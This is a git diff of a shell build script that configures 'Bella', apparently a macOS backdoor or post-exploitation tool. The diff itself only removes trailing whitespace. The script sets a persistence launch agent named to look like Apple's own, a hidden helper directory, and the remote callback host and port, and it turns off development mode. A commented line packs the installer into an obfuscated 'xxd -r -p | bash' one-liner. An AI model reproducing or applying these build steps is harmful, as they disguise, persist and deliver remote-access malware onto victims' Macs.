@@ -30,13 +30,13 @@ if [[ -z "$port" ]]; then
 fi
 
 echo -e '\033[92mConfiguring your Bella installation\033[0m'
-sed -i '' -e "s@com.apple.Bella@$launchagent@" $BuildsPath/bella.py 
-sed -i '' -e "s@Containers/.bella@$helperLoc@" $BuildsPath/bella.py 
-sed -i '' -e "s@4545@$port@" $BuildsPath/bella.py 
+sed -i '' -e "s@com.apple.Bella@$launchagent@" $BuildsPath/bella.py
+sed -i '' -e "s@Containers/.bella@$helperLoc@" $BuildsPath/bella.py
+sed -i '' -e "s@4545@$port@" $BuildsPath/bella.py
 sed -i '' -e "s@127.0.0.1@$host@" $BuildsPath/bella.py
 #sed -i '' -e "s@\(^[[:space:]]*\)\(print.*$\)@@g" $BuildsPath/bella.py
 #sed -i '' -e "s@LAUNCHAGENTNAME=NONE@LAUNCHAGENTNAME=$launchagent@" $BuildsPath/INSTALLER
-#sed -i '' -e "s@HELPERLOCATION=NONE@HELPERLOCATION=$helperLoc@" $BuildsPath/INSTALLER 
+#sed -i '' -e "s@HELPERLOCATION=NONE@HELPERLOCATION=$helperLoc@" $BuildsPath/INSTALLER
 #sed -i '' -e "s@#Framework. This will be modified with the build. DO NOT USE THIS.@@" $BuildsPath/INSTALLER
 sed -i '' -e "s@development = True@development = False@" $BuildsPath/bella.py
 
@@ -94,7 +94,7 @@ echo -e '\033[94mDone!\033[0m'
 #zip -j $BuildsPath/bella.zip $BuildsPath/$bellaNoExt $payloads_path
 
 #x=$(xxd -p $BuildsPath/INSTALLER) #hex code of the installer
-#printf "echo \"$x\" | xxd -r -p | bash" > $BuildsPath/KITTEN 
+#printf "echo \"$x\" | xxd -r -p | bash" > $BuildsPath/KITTEN
 
 #echo -ne '\033[32m'
 
